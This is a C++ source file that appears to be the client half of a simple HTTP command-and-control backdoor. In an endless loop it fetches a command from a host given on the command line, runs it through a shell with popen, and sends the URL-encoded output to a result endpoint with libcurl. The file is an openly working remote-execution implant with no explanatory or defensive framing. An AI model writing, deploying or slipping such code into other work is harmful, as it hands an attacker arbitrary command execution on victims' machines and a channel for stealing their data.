#include <iostream>
#include <stdio.h>
#include <curl/curl.h>
#include <sstream>
#include <array>
#include <memory>
using namespace std;


string buffer;

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
            result += buffer.data();
    }
    return result;
}
void runcommand(string cmd){
    //cout<<"running "<<cmd << "\n" << std::flush;
    string result=exec(cmd.c_str());
    CURL *curl;
    curl = curl_easy_init();
    string myurl="http://127.0.0.1:8080/result?data=";
    //myurl+=cmd;
    const char* cmdencoded=curl_easy_escape(curl,result.c_str(),0);
    myurl+=cmdencoded;
    //cout << "myurl is " << myurl;
      
    curl_easy_setopt(curl, CURLOPT_URL, myurl.c_str());
    cmd=curl_easy_perform(curl);
    //cout << "got " << cmd << "\n" << std::flush;
    //cout << "-------------" << cmd << "-------\n" << std::flush;
    //curl_easy_cleanup(curl);

}
size_t write_data(char *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    buffer.assign(ptr);
    return written;
}

int main(int argc,char* argv[])
{
  CURL *curl;
  CURLcode res;


  curl_global_init(CURL_GLOBAL_DEFAULT);
  curl = curl_easy_init();
 

  if(curl) {
    //curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8080");
    if (argc < 2) {
    	cout << "Usage: http://host:port\n";
	return 0;
    }
    curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); 

	cout << "Client Running\n" << std::flush;
	while(1){
   		res = curl_easy_perform(curl);
   		runcommand(buffer);
	}
   		curl_easy_cleanup(curl);
  }

  curl_global_cleanup();

  return 0;
}
